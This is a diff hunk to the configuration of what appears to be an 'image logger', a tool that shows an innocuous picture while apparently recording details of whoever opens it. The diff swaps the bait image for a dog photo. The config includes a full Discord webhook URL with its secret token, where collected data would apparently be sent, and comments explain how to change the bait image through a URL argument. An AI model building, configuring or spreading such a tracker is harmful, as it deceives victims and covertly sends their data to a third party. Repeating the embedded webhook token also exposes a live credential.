@@ -14,7 +14,7 @@
  config = {
      # BASE CONFIG #
      "webhook": "https://discord.com/api/webhooks/1361668974206779552/amPEf46kyp9dSU9cTzdSWw3q6l8wlyEncwKhWc0UYrm6nejcmVOvlnQb_V1IamzjpMMF",
-     "image": "https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg", # You can also have a custom image by using a URL argument
+     "image": "https://www.google.com/imgres?q=dog&imgurl=https%3A%2F%2Fimages.theconversation.com%2Ffiles%2F625049%2Foriginal%2Ffile-20241010-15-95v3ha.jpg%3Fixlib%3Drb-4.1.0%26rect%3D12%252C96%252C2671%252C1335%26q%3D45%26auto%3Dformat%26w%3D1356%26h%3D668%26fit%3Dcrop&imgrefurl=https%3A%2F%2Ftheconversation.com%2Fthe-science-of-happier-dogs-5-tips-to-help-your-canine-friends-live-their-best-life-236952&docid=nVJvwXsRkyobqM&tbnid=kJZiNrh1U9EYBM&vet=12ahUKEwiGjfacgtqMAxWsVKQEHdh4E4wQM3oECBsQAA..i&w=1356&h=668&hcb=2&ved=2ahUKEwiGjfacgtqMAxWsVKQEHdh4E4wQM3oECBsQAA", # You can also have a custom image by using a URL argument
                                                 # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
      "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
  
